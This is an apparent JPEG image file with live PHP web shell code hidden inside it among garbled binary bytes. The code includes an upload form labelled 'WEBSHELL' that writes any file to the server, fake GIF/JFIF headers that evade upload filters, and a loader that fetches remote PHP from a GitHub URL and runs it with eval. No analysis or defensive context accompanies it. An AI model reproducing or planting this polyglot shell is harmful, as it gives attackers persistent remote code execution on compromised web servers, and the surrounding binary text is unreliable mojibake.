ï¿½ï¿½ï¿½ï¿½JFIFï¿½ï¿½xï¿½xï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Exifï¿½ï¿½MMï¿½*ï¿½ï¿½ï¿½ï¿½
ï¿½ï¿½ï¿½ï¿½Eï¿½ï¿½ï¿½Jï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<!DOCTYPE html>
<html>
<head>
  <title>NOWMEEEE - WEBSHELL</title>
</head>
<body>
  <form enctype="multipart/form-data" action="" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "";
    $path = $path . basename( $_FILES['uploaded_file']['name']);

    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
  }
?>ï¿½ï¿½ï¿½ï¿½ï¿½xï¿½ï¿½ï¿½ï¿½ï¿½ï¿½xï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Cï¿½




ï¿½ï¿½ï¿½C		

ï¿½ï¿½ï¿½ï¿½<ï¿½d"ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½	
ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½}ï¿½!1AQa"q2ï¿½ï¿½ï¿½#Bï¿½ï¿½Rï¿½ï¿½$3brï¿½	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½	
ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½wï¿½!1AQaq"2ï¿½Bï¿½ï¿½ï¿½ï¿½	#3Rï¿½brï¿½
$4ï¿½%ï¿½&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½ï¿½Sï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½(ï¿½ï¿½<html><link rel='icon' href='https://e.top4top.io/p_26973oc9i1.png' sizes='20x20' type='image/png'>Ã¿Ã˜Ã¿Ã  JFIF Ã¿Ã¾;GIF89;aGIF89;aGIF89;a<?=/****/@null; /********/ /*******/ /********/@trim("?>");/**/?><?pHp
   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
      eval('?>' . get('https://raw.githubusercontent.com/NowMeee/shellk/master/nomi88.php'));
?>
